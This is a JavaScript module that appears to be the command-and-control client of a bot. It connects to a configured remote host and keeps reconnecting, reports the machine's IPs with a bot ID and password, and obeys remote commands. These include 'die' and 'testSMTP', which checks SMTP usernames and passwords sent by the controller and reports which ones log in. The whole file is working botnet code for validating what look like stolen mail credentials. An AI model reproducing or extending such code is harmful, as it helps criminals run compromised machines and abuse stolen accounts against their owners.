'use strict';

const Sender = require('./sender');
const Connection = require('./connection');
const Utils = require('./utils');
const assert = require('assert');
const net = require('net');
const Promise = require('../modules/bluebird');
const config = require('./config');

class Home {
  static init() {
    this._msgQueue = [];
    this._ips = Utils.getIPS(),
    this._connect();
    this._msgHandler = {
      'die': this._handleDie.bind(this),
      'testSMTP': this._testSMTP.bind(this)
    };
  }

  static _testSMTP(msg) {
    const smtp = msg.smtp;
    const user = msg.user;
    const pass = msg.pass;

    const resp = {
      respID: msg.id
    };

    Sender.checkAsync(smtp, user, pass)
      .then(success => {
	assert(success);
	resp.success = true;
      })
      .catch(err => {
	resp.success = false;
	resp.err = err;
      })
      .finally(() => {
	this.sendMsg(resp);
      });
  }

  static _handleDie(msg) {
    if (this._con) {
      this._con.die();
    }
    process.exit(0);
  }

  static sendDebugMsg(msg) {
    assert(!msg.type);
    msg.type = 'debug';
    this.sendMsg(msg);
  }

  static sendMsg(msg, cb) {
    if (this._con) {
      this._con.sendMsg(msg, cb);
    }
    this._msgQueue.push({
      msg: msg,
      cb: cb
    });
  }

  static _onConnect(sock) {
    assert(sock.remoteAddress);
    this._con = new Connection(sock);
    this._con.sendMsg({
      type: 'hello',
      ips: this._ips,
      hasDNS: config.globals.hasDNS,
      botID: config.globals.botID,
      pass: config.pass,
      version: config.globals.version
    });
    this._con.setKeepAlive(30); // todo: += random?
    for (let i = 0; i < this._msgQueue.length; i++) {
      const {msg, cb} = this._msgQueue[i];
      this._con.sendMsg(msg, cb);
    }
    this._msgQueue = [];
    for (let key in this._msgHandler) {
      if (!this._msgHandler.hasOwnProperty(key)) {
        continue;
      }
      const val = this._msgHandler[key];
      console.log(key);
      console.log(val);
      this._con.setMsgHandler(key, val);
    }
  }

  static _connect(cb = Function.prototype) {
    console.log('connecting');
    assert(!this._con || !this._con.isAlive());
    const sock = net.connect(config.globals.port, config.globals.host, () => {
      console.log('connected');
      sock.removeListener('close', onCanNotConnect);
      sock.removeListener('timeout', onTimeoutBeforeConnect);

      sock.on('close', () => {
	console.log('closed');
	this._con = null;
	console.log('closed');
	setTimeout(() => {
	  this._connect(cb);
	}, 1000);
      });
      this._onConnect(sock);
      cb();
    });

    sock.on('close', onCanNotConnect);

    sock.on('error', err => {
      console.log('error');
      console.log(err);
    });
    sock.setTimeout(10 * 1000, onTimeoutBeforeConnect);

    function onTimeoutBeforeConnect() {
      sock.destroy();
    }

    const self = this;
    function onCanNotConnect() {
      setTimeout(() => {
	console.log('can not connect');
	self._connect(cb);
      }, 1000);
    }
  }
  
};

module.exports = Home;
